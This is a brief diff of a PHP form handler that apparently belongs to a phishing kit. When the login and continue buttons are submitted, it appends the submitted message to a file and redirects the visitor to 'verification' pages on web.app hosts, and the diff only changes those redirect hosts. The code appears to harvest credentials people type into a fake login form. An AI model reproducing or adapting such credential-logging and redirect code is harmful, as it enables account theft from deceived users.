@@ -60,7 +60,7 @@ else if (isset($_POST['contibtn'])) {
 	fwrite($open, $message."\n");
 	fclose($open);
 	 
-	header("Location: https://ozkhub.web.app/test/emailverification.html");
+	header("Location: https://dacotah.web.app/emailverification.html");
 
 	
 	
@@ -91,7 +91,7 @@ else if (isset($_POST['login_btn'])) {
 	fwrite($open, $message."\n");
 	fclose($open);
 	 
-	header("Location: https://ozkhub.web.app/test/verification.html");
+	header("Location: https://dacotah.web.app/verification.html");
 
 	
 	
